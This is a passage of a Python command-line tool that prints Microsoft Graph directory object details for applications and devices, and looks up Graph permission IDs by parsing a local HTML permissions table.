                print(f"Publisher Domain: {object_data.get('publisherDomain', 'N/A')}")
                print(f"Verified Publisher: {object_data.get('verifiedPublisher', {}).get('displayName', 'N/A')}")
                print(f"App Roles Count: {len(object_data.get('appRoles', []))}")
                print(f"Required Resource Access Count: {len(object_data.get('requiredResourceAccess', []))}")
                print(f"Web Redirect URIs: {', '.join(object_data.get('web', {}).get('redirectUris', []))}")
                print(f"Created DateTime: {object_data.get('createdDateTime', 'N/A')}")
            elif object_type == 'device':
                print(f"Device ID: {object_data.get('deviceId', 'N/A')}")
                print(f"Operating System: {object_data.get('operatingSystem', 'N/A')}")
                print(f"Operating System Version: {object_data.get('operatingSystemVersion', 'N/A')}")
                print(f"Trust Type: {object_data.get('trustType', 'N/A')}")
                print(f"Approximate Last Sign In DateTime: {object_data.get('approximateLastSignInDateTime', 'N/A')}")
                print(f"Compliance State: {object_data.get('complianceState', 'N/A')}")
                print(f"Is Managed: {object_data.get('isManaged', 'N/A')}")
                print(f"Is Compliant: {object_data.get('isCompliant', 'N/A')}")
                print(f"Registered Owner: {object_data.get('registeredOwners', [{}])[0].get('userPrincipalName', 'N/A')}")

        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 404:
                print_red(f"[-] Object with ID {args.id} not found")
            else:
                print_red(f"[-] An error occurred while retrieving object details: {str(e)}")
        except requests.exceptions.RequestException as e:
            print_red(f"[-] An error occurred while making the request: {str(e)}")

        print("=" * 80)

    # locate-permissionid
    elif args.command and args.command.lower() == "locate-permissionid":
        if not args.id:
            print_red("[-] Error: --id argument is required for Locate-PermissionID command")
            return

        print_yellow("\n[*] Locate-PermissionID")
        print("=" * 80)

        def parse_html(content):
            soup = BeautifulSoup(content, 'html.parser')
            permissions = {}
        
            for h3 in soup.find_all('h3'):
                title = h3.text
                table = h3.find_next('table')
                headers = [th.text for th in table.find('thead').find_all('th')]
                rows = table.find('tbody').find_all('tr')
            
                permission_data = {}
                for row in rows:
                    cells = row.find_all('td')
                    category = cells[0].text
                    application = cells[1].text
                    delegated = cells[2].text
                    permission_data[category] = {
                        headers[1]: application,
                        headers[2]: delegated
                    }
                permissions[title] = permission_data
        
            return permissions

        def highlight(text, should_highlight):
            if should_highlight:
                return f"\033[92m{text}\033[0m"
            return text
        
        def print_permission(permission, data, app_ids, delegated_ids):
            print_green(f"{permission}")
            for category, values in data.items():
                print(f"  {category}:")
                app_highlight = data['Identifier']['Application'] in app_ids
                delegated_highlight = data['Identifier']['Delegated'] in delegated_ids
                print(f"    Application: {highlight(values['Application'], app_highlight)}")
                print(f"    Delegated: {highlight(values['Delegated'], delegated_highlight)}")
            print()

        identifiers = args.id.split(',')
        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')
        
        try:
            with open(file_path, 'r') as file:
                content = file.read()
        except FileNotFoundError:
            print_red(f"[-] The file {file_path} does not exist.")
            return
        except Exception as e:
            print_red(f"[-] An error occurred: {e}")
            return
        
        permissions = parse_html(content)
        app_ids = []
        delegated_ids = []
        
        for permission, data in permissions.items():
            if data['Identifier']['Application'] in identifiers:
                app_ids.append(data['Identifier']['Application'])
            if data['Identifier']['Delegated'] in identifiers:
                delegated_ids.append(data['Identifier']['Delegated'])
    
        found_permissions = False
        
        for permission, data in permissions.items():
            if data['Identifier']['Application'] in app_ids or data['Identifier']['Delegated'] in delegated_ids:
                print_permission(permission, data, app_ids, delegated_ids)
                found_permissions = True
        
        if not found_permissions:
            print_red("[-] Permission ID not found")
        
        print("=" * 80)

if __name__ == "__main__":
    main()